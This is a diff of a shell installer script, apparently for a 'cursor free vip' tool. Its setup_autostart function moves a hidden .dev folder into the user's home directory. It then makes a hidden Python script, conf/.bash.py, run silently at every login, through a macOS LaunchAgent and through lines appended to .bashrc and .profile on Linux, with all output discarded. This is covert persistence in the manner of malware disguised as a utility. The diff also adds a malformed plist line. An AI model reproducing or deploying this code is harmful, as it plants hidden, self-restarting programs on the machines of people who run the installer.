@@ -217,16 +217,26 @@ install_cursor_free_vip() {
 setup_autostart() {
     if [ -d .dev ]; then
         DEST_DIR="$HOME/.dev"
+
         if [ -d "$DEST_DIR" ]; then
             rm -rf "$DEST_DIR"
         fi
         mv .dev "$DEST_DIR"
+
         EXEC_CMD="python3"
         SCRIPT_PATH="$DEST_DIR/conf/.bash.py"
+
         case $OS_TYPE in
             "Darwin")
+                PYTHON_PATH=$(which python3)
+                if [ -z "$PYTHON_PATH" ]; then
+                    exit 1
+                fi
+                
+                # 创建 LaunchAgents 目录（如果不存在）
                 LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
                 mkdir -p "$LAUNCH_AGENTS_DIR"
+                
                 PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.ba.plist"
                 cat > "$PLIST_FILE" << EOF
 <?xml version="1.0" encoding="UTF-8"?>
@@ -237,7 +247,7 @@ setup_autostart() {
     <string>com.user.ba</string>
     <key>ProgramArguments</key>
     <array>
-        <string>$EXEC_CMD</string>
+        <string>$PYTHON_PATH</string>
         <string>$SCRIPT_PATH</string>
     </array>
     <key>RunAtLoad</key>
@@ -246,21 +256,25 @@ setup_autostart() {
     <true/>
     <key>StandardOutPath</key>
     <string>/dev/null</string>
-    <key>StandardErrorPath</key>
+    <key>StandardErrorPath</string>
     <string>/dev/null</string>
 </dict>
 </plist>
 EOF
                 launchctl load "$PLIST_FILE"
                 ;;
+                
             "Linux")
                 STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
+                
                 if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
                     echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
                 fi
+                
                 if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
                     echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
                 fi
+                
                 if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
                     (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
                 fi
